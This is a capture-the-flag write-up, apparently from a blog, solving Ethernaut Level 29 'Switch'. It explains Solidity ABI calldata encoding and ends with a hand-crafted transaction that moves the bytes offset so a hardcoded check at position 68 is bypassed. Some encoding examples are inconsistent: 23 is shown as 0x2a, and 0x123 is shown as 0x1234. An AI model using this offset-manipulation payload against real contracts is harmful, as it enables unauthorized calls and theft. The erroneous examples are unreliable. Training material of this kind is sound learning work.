# Solving Ethernaut Level 29: Switch

![img](https://img.learnblockchain.cn/attachments/2023/06/HCN5J9Xo648acb726c2fd.webp)

With Ethernaut Switch from [OpenZeppelin](https://www.openzeppelin.com/), you only have these 3 functions that can be called externally: **flipSwitch**, **turnSwitchOn**, and **turnSwitchOff.**

But **flipSwitch** is the only function you can call as **turnSwitchOn** and **turnSwitchOff** can be accessed only if the msg.sender is our contract (because of the **onlyThis** modifier).

Let’s take a look at the function that you could call:

```typescript
 function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }
```

You see that **flipSwitch** has a modifier, **onlyOff**, that performs a check on the calldata.

```typescript
modifier onlyOff() {
        // you can use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }
```

The modifier checks if the data that can be found starting at position 68 and with the length of 4 bytes is the selector of the **turnOffSwitch** function. 

At a first look, **flipSwitch** can be called only with the **turnSwitchOff** as data, but by manipulating the [calldata](https://www.quicknode.com/guides/ethereum-development/transactions/ethereum-transaction-calldata/) encoding, you’ll see that this affirmation isn’t true.

## Calldata Encoding Essentials for Static Types

The static types are the following:

- ‘uint’s
- ‘int’s
- ‘address’
- ‘bool’
- ‘bytes’-n
- ‘tuples’

The representation of those types is their representation in hex, padded with zeros to cover a 32 byte slot.

```
Input: 23 (uint256)

Output:
0x000000000000000000000000000000000000000000000000000000000000002a
Input: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f (address of Uniswap)

Output: 
0x000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f
```

## Calldata Encoding Essentials for Dynamic Types(string, bytes and arrays)

For dynamic types, the calldata encoding is based on the following:

- first 32-bytes are for the offset
- next 32 bytes are for the length
- and next are for the values

### Examples of input

1. **Bytes:**

```
Input: 0x123

Output: 
0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
```

Where:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020

length(the value is 2 bytes length = 4 chrs):
0000000000000000000000000000000000000000000000000000000000000002

value(the value of string and bytes starts right after the length):
1234000000000000000000000000000000000000000000000000000000000000
```

**2. String:**

```
Input: “GM Frens”

Output: 
0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000008474d204672656e73000000000000000000000000000000000000000000000000
```

Where:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020 

length:
0000000000000000000000000000000000000000000000000000000000000008 

value(“GM Frens” in hex):
474d204672656e73000000000000000000000000000000000000000000000000 
```

**3. Arrays**

```
Input: [1,3,42] → uint256 array

Output:
0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000002a
```

Where:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020 

length (3 elements in the array):
0000000000000000000000000000000000000000000000000000000000000003 

first element value(1):
0000000000000000000000000000000000000000000000000000000000000001 

second element value(3):
0000000000000000000000000000000000000000000000000000000000000003 

third element value(42):
000000000000000000000000000000000000000000000000000000000000002a 
```

One example of call that you can make to this contract is(NOT the solution):

```
0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
```

Where:

```
function selector: 
30c13ade

offset:
0000000000000000000000000000000000000000000000000000000000000020 

length:
0000000000000000000000000000000000000000000000000000000000000004 

value:
20606e1500000000000000000000000000000000000000000000000000000000
```

### What Is The Offset?

The offset indicates the start of the data. Data is formed from a length and value. In our example the offset was 20 in hex, which is 32 in decimal. That means that our data starts after the [first 32 bytes ](https://solidity-fr.readthedocs.io/fr/v0.5.0/miscellaneous.html)from the start of the encoding.

```typescript
0000000000000000000000000000000000000000000000000000000000000020
^
| -> counting 32 bytes from here


0000000000000000000000000000000000000000000000000000000000000004
^
| so this is the actual start


20606e1500000000000000000000000000000000000000000000000000000000
```

Let’s see an example of a function calldata that has both static and dynamic params:

```typescript
pragma solidity 0.8.19;
contract Example {
    function transfer(bytes memory data, address to) external;
}
```

With the following parameters:

```
data: 0x1234
to: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
```

This will generate the following calldata:

```
0xbba1b1cd00000000000000000000000000000000000000000000000000000000000000400000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f00000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
```

Let’s analyze it:

```
0x

function selector (transfer):
Bba1b1cd

offset of the 'data' param (64 in decimal):
0000000000000000000000000000000000000000000000000000000000000040 

address param 'to':
0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f 

length of the 'data' param:
0000000000000000000000000000000000000000000000000000000000000002 

value of the 'data' param:
1234000000000000000000000000000000000000000000000000000000000000
```

As you can see in this example, with the help of offset, you can move the data content(length and value) after the address param(to).

In our contract, the check on the calldata is made at a hardcoded value, **68**. So, the solution is to move the data that is checked from the data that is used to make the call.

The three essential details **to keep in mind about calldata encoding for dynamic types** are:

1. the existence of the offset (the offset being **the position in the calldata where the actual data of the dynamic type begins**)
2. By altering the offset, you can manipulate where the calldata value starts

**The solution:**

```
await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

**Explanation**:

```
function selector:
30c13ade

offset, now = 96-bytes:
0000000000000000000000000000000000000000000000000000000000000060 

extra bytes:
0000000000000000000000000000000000000000000000000000000000000000 

here is the check at 68 byte (used only for the check, not relevant for the external call made by our function):
20606e1500000000000000000000000000000000000000000000000000000000

length of the data:
0000000000000000000000000000000000000000000000000000000000000004 

data that contains the selector of the function that will be called from our function:
76227e1200000000000000000000000000000000000000000000000000000000 
```

## Conclusion: Ethernaut Switch Level 29 Gives You a Better Understanding of Data Encoding

With this workaround and learning more about this new vulnerability, you’ll level up your EVM and Solidity language skills.

If you want to find out solutions to other Ethernaut challenges, check our [GitHub](https://github.com/Softbinator/ethernaut-solutions).

Stay tuned and follow our blog for more practical tips about EVM [smart contracts](https://blog.softbinator.com/check-smart-contract-state-changes-hardhat-tasks/)!



原文链接：https://blog.softbinator.com/solving-ethernaut-level-29-switch/